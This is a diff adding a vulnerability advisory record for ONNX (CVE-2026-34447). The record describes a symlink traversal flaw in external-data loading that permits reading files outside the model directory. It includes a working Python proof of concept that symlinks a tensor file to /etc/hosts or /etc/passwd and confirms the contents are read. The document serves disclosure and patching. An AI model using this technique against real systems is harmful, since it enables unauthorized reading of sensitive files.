@@ -1,0 +1,98 @@
+{
+  "id": "GHSA-p433-9wv8-28xj",
+  "modified": "2026-04-01T21:35:45.917402Z",
+  "published": "2026-04-01T21:14:00Z",
+  "aliases": [
+    "CVE-2026-34447"
+  ],
+  "summary": "ONNX: External Data Symlink Traversal",
+  "details": "Summary\n- Issue: Symlink traversal in external data loading allows reading files outside the model directory.\n- Affected code: `onnx/onnx/checker.cc: resolve_external_data_location` used via Python `onnx.external_data_helper.load_external_data_for_model`.\n- Impact: Arbitrary file read (confidentiality breach) when a model’s external data path resolves to a symlink targeting a file outside the model directory.\n\nRoot Cause\n- The function `resolve_external_data_location(base_dir, location, tensor_name)` intends to ensure that external data files reside within `base_dir`. It:\n  - Rejects empty/absolute paths\n  - Normalizes the relative path and rejects `..`\n  - Builds `data_path = base_dir / relative_path`\n  - Checks `exists(data_path)` and `is_regular_file(data_path)`\n- However, `std::filesystem::is_regular_file(path)` follows symlinks to their targets. A symlink placed inside `base_dir` that points to a file outside `base_dir` will pass the checks and be returned. The Python loader then opens the path and reads the target file.\n\nCode Reference\n- File: onnx/onnx/checker.cc:970-1060\n- Key logic:\n  - Normalization: `auto relative_path = file_path.lexically_normal().make_preferred();`\n  - Existence: `std::filesystem::exists(data_path)`\n  - Regular file check: `std::filesystem::is_regular_file(data_path)`\n  - Returned path is later opened in Python: `external_data_helper.load_external_data_for_tensor`.\n\nProof of Concept (PoC)\n- File: `onnx_external_data_symlink_traversal_poc.py`\n- Behavior: Creates a model with an external tensor pointing to `tensor.bin`. In the model directory, creates `tensor.bin` as a symlink to `/etc/hosts` (or similar). Calls `load_external_data_for_model(model, base_dir)`. Confirms that `tensor.raw_data` contains content from the target outside the model directory.\n- Run:\n  - `python3 onnx_external_data_symlink_traversal_poc.py`\n  - Expected: `[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir`\n\nonnx_external_data_symlink_traversal_poc.py\n\n```python\n#!/usr/bin/env python3\n\"\"\"\nONNX External Data Symlink Traversal PoC\n\nFinding: load_external_data_for_model() (via c_checker._resolve_external_data_location)\ndoes not reject symlinks. A relative location that is a symlink inside the\nmodel directory can target a file outside the directory and will be read.\n\nImpact: Arbitrary file read outside model_dir when external data files are\nobtained from attacker-controlled archives (zip/tar) that create symlinks.\n\nThis PoC:\n - Creates a model with a tensor using external_data location 'tensor.bin'\n - Creates 'tensor.bin' as a symlink to a system file (e.g., /etc/hosts)\n - Calls load_external_data_for_model(model, base_dir)\n - Confirms that tensor.raw_data contains the content of the outside file\n\nSafe: only reads a benign system file if present.\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport pathlib\n\n# Ensure we import installed onnx, not the local cloned package\n_here = os.path.dirname(os.path.abspath(__file__))\nif _here in sys.path:\n    sys.path.remove(_here)\n\nimport onnx\nfrom onnx import helper, TensorProto\nfrom onnx.external_data_helper import (\n    set_external_data,\n    load_external_data_for_model,\n)\n\n\ndef pick_target_file():\n    candidates = [\"/etc/hosts\", \"/etc/passwd\", \"/System/Library/CoreServices/SystemVersion.plist\"]\n    for p in candidates:\n        if os.path.exists(p) and os.path.isfile(p):\n            return p\n    raise RuntimeError(\"No suitable readable system file found for this PoC\")\n\n\ndef build_model_with_external(location: str):\n    # A 1D tensor; data will be filled from external file\n    tensor = helper.make_tensor(\n        name=\"X_ext\",\n        data_type=TensorProto.UINT8,\n        dims=[0],  # dims will be inferred after raw_data is read\n        vals=[],\n    )\n    # add dummy raw_data then set_external_data to mark as external\n    tensor.raw_data = b\"dummy\"\n    set_external_data(tensor, location=location)\n\n    # Minimal graph that just feeds the initializer as Constant\n    const_node = helper.make_node(\"Constant\", inputs=[], outputs=[\"out\"], value=tensor)\n    graph = helper.make_graph([const_node], \"g\", inputs=[], outputs=[helper.make_tensor_value_info(\"out\", TensorProto.UINT8, None)])\n    model = helper.make_model(graph)\n    return model\n\n\ndef main():\n    base = tempfile.mkdtemp(prefix=\"onnx_symlink_poc_\")\n    model_dir = base\n    link_name = os.path.join(model_dir, \"tensor.bin\")\n\n    target = pick_target_file()\n    print(f\"[*] Using target file: {target}\")\n\n    # Create symlink in model_dir pointing outside\n    try:\n        pathlib.Path(link_name).symlink_to(target)\n    except OSError as e:\n        print(f\"[!] Failed to create symlink: {e}\")\n        print(\"    This PoC needs symlink capability.\")\n        return 1\n\n    # Build model referencing the relative location 'tensor.bin'\n    model = build_model_with_external(location=\"tensor.bin\")\n\n    # Use in-memory model; explicitly load external data from base_dir\n    loaded = model\n    print(\"[*] Loading external data into in-memory model...\")\n    try:\n        load_external_data_for_model(loaded, base_dir=model_dir)\n    except Exception as e:\n        print(f\"[!] load_external_data_for_model raised: {e}\")\n        return 1\n\n    # Validate that raw_data came from outside file by checking a prefix\n    raw = None\n    # Search initializers\n    for t in loaded.graph.initializer:\n        if t.name == \"X_ext\" and t.HasField(\"raw_data\"):\n            raw = t.raw_data\n            break\n    # Search constant attributes if not found\n    if raw is None:\n        for node in loaded.graph.node:\n            for attr in node.attribute:\n                if attr.HasField(\"t\") and attr.t.name == \"X_ext\" and attr.t.HasField(\"raw_data\"):\n                    raw = attr.t.raw_data\n                    break\n            if raw is not None:\n                break\n    if raw is None:\n        print(\"[?] Did not find raw_data on tensor; PoC inconclusive\")\n        return 2\n\n    with open(target, \"rb\") as f:\n        target_prefix = f.read(32)\n    if raw.startswith(target_prefix):\n        print(\"[!!!] VULNERABILITY CONFIRMED: external_data symlink escaped base_dir\")\n        print(f\"      Symlink {link_name} -\u003e {target}\")\n        return 0\n    else:\n        print(\"[?] Raw data did not match target prefix; environment-specific behavior\")\n        return 3\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "onnx",
+        "purl": "pkg:pypi/onnx"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.21.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.2",
+        "0.2.1",
+        "1.0.0",
+        "1.0.1",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.10.0",
+        "1.10.1",
+        "1.10.2",
+        "1.11.0",
+        "1.12.0",
+        "1.13.0",
+        "1.13.1",
+        "1.14.0",
+        "1.14.1",
+        "1.15.0",
+        "1.16.0",
+        "1.16.1",
+        "1.16.2",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.19.1",
+        "1.19.1rc1",
+        "1.2.1",
+        "1.2.2",
+        "1.2.3",
+        "1.20.0",
+        "1.20.0rc1",
+        "1.20.0rc2",
+        "1.20.1",
+        "1.20.1rc1",
+        "1.21.0rc1",
+        "1.21.0rc2",
+        "1.21.0rc3",
+        "1.21.0rc4",
+        "1.3.0",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.6.0",
+        "1.7.0",
+        "1.8.0",
+        "1.8.1",
+        "1.9.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-p433-9wv8-28xj/GHSA-p433-9wv8-28xj.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/onnx/onnx/security/advisories/GHSA-p433-9wv8-28xj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-34447"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/onnx/onnx"
+    }
+  ]
+}
